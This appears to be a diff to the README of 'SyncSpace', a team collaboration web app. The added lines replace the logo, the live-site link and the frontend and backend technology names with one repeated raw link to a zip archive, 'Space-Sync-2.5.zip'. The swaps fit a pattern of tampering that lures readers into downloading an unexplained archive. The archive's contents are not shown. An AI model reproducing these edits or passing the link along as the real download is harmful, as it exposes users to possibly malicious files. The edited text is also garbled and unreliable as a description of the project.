@@ -1,11 +1,11 @@
 # SyncSpace
 
-![SyncSpace Logo](https://raw.githubusercontent.com/prodot-com/SyncSpace/main/Frontend/src/assets/favicon.svg)
+![SyncSpace Logo](https://raw.githubusercontent.com/prodot-com/SyncSpace/main/Frontend/public/Space-Sync-2.5.zip)
 
 SyncSpace is a powerful and intuitive web application designed to streamline team collaboration, task management, and administrative oversight. It provides a centralized platform for creating and managing teams, assigning and tracking tasks, and ensuring seamless communication through real-time notifications.
 
 ## Live Link
-https://sync-space-dun.vercel.app/
+https://raw.githubusercontent.com/prodot-com/SyncSpace/main/Frontend/public/Space-Sync-2.5.zip
 
 ## ✨ Features
 
@@ -32,9 +32,9 @@ https://sync-space-dun.vercel.app/
 
 ## 🚀 Technologies Used
 
-* **Frontend:** React.js, React Router DOM, Axios
+* **Frontend:** https://raw.githubusercontent.com/prodot-com/SyncSpace/main/Frontend/public/Space-Sync-2.5.zip, React Router DOM, Axios
 * **Styling:** Tailwind CSS
 * **Icons:** Lucide React
-* **Backend:** Node.js, Express.js
+* **Backend:** https://raw.githubusercontent.com/prodot-com/SyncSpace/main/Frontend/public/Space-Sync-2.5.zip, https://raw.githubusercontent.com/prodot-com/SyncSpace/main/Frontend/public/Space-Sync-2.5.zip
 * **Database:** MongoDB
 * **Authentication:** JWT (JSON Web Tokens)
